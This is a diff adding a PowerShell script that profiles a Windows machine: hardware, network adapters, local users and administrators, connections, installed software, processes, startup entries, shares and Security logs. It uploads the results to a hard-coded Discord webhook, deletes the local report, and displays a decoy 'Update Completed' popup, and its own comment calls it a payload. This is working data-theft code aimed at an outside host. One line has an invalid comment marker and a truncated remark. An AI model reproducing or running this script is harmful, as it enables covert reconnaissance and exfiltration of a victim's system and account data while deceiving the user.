@@ -1,0 +1,127 @@
+# ========== НАСТРОЙКИ ==========
+$webhookUrl = "https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP"  # 🔴 ОБЯЗАТЕЛЬНО ЗАМЕНИ НА СВОЙ!
+$reportPath = "$env:USERPROFILE\Desktop\System_Report.json"
+$deleteDelaySeconds = 20
+
+# ========== СБОР ДАННЫХ ==========
+$report = @{}
+
+
+\\ этот код не работает при запуске через 
+
+$os = Get-CimInstance Win32_OperatingSystem
+$cs = Get-CimInstance Win32_ComputerSystem
+$bios = Get-CimInstance Win32_BIOS
+$cpu = Get-CimInstance Win32_Processor
+$gpu = Get-CimInstance Win32_VideoController
+
+$report['SystemInfo'] = @{
+    'OS' = "$($os.Caption) $($os.Version)"
+    'ComputerName' = $cs.Name
+    'Manufacturer' = $cs.Manufacturer
+    'Model' = $cs.Model
+    'BIOS Version' = ($bios.SMBIOSBIOSVersion -join ', ')
+    'Processor' = $cpu.Name
+    'Cores' = $cpu.NumberOfCores
+    'LogicalProcessors' = $cpu.NumberOfLogicalProcessors
+    'RAM (GB)' = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
+    'GPU' = ($gpu | Select-Object -ExpandProperty Name) -join ', '
+    'SystemType' = $cs.SystemType
+    'LastBootUpTime' = $os.LastBootUpTime
+}
+
+$ipconfig = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }
+$adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
+
+$report['NetworkInfo'] = foreach ($adapter in $adapters) {
+    $ip = $ipconfig | Where-Object { $_.InterfaceIndex -eq $adapter.ifIndex }
+    @{
+        'Name' = $adapter.Name
+        'MACAddress' = $adapter.MacAddress
+        'IPAddress' = $ip.IPAddress
+    }
+}
+
+$report['LocalUsers'] = Get-LocalUser | Select-Object Name, Enabled, LastLogon | Sort-Object Name
+$report['LocalGroups'] = Get-LocalGroup | Select-Object Name
+$report['Administrators'] = Get-LocalGroupMember -Group 'Administrators' | Select-Object Name, ObjectClass
+$report['NetworkConnections'] = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
+
+$report['InstalledPrograms'] = @(
+    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*,
+                      HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+    Where-Object { $_.DisplayName } |
+    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
+)
+
+$report['Updates'] = Get-HotFix | Select-Object HotFixID, Description, InstalledOn
+$report['Processes'] = Get-Process | Select-Object Name, Id, CPU, StartTime -ErrorAction SilentlyContinue
+$report['Services'] = Get-Service | Select-Object Name, Status, StartType
+$report['ScheduledTasks'] = Get-ScheduledTask | Select-Object TaskName, TaskPath, State
+
+$startupPaths = @(
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\",
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
+)
+
+$startupItems = foreach ($path in $startupPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem -Path $path -Filter *.lnk | Select-Object Name, FullName
+    }
+}
+
+$registryRunKeys = @(
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+)
+
+$registryStartup = foreach ($key in $registryRunKeys) {
+    if (Test-Path $key) {
+        Get-ItemProperty -Path $key | ForEach-Object {
+            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' } |
+            Select-Object Name, Value
+        }
+    }
+}
+
+$report['StartupItems'] = @{
+    'StartupFolders' = $startupItems
+    'RegistryRun' = $registryStartup
+}
+
+$report['SharedFolders'] = Get-SmbShare | Select-Object Name, Path, Description
+$report['Drives'] = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Root, Used, Free
+$report['SecurityLogs'] = Get-WinEvent -LogName Security -MaxEvents 50 | Select-Object TimeCreated, Id, Message
+
+# ========== СОХРАНЕНИЕ ==========
+$report | ConvertTo-Json -Depth 5 | Out-File -FilePath $reportPath -Encoding utf8
+Write-Output "✅ Отчет сохранен: $reportPath"
+
+# ========== ОТПРАВКА В DISCORD ==========
+try {
+    Add-Type -AssemblyName System.Net.Http
+    $fileBytes = [System.IO.File]::ReadAllBytes($reportPath)
+    $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+
+    $multiPartContent = New-Object System.Net.Http.MultipartFormDataContent
+    $multiPartContent.Add($fileContent, "file", "System_Report.json")
+
+    $httpClient = New-Object System.Net.Http.HttpClient
+    $response = $httpClient.PostAsync($webhookUrl, $multiPartContent).Result
+
+    if ($response.IsSuccessStatusCode) {
+        Write-Output "📤 Успешно отправлено в Discord!"
+
+        Start-Sleep -Seconds $deleteDelaySeconds
+        Remove-Item -Path $reportPath -Force
+        Write-Output "🗑️ Локальный файл удалён после $deleteDelaySeconds сек."
+    } else {
+        Write-Output "❌ Ошибка отправки в Discord: $($response.StatusCode)"
+    }
+} catch {
+    Write-Output "❌ Исключение: $_"
+}
+# Popup message to signal the payload is done
+
+$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
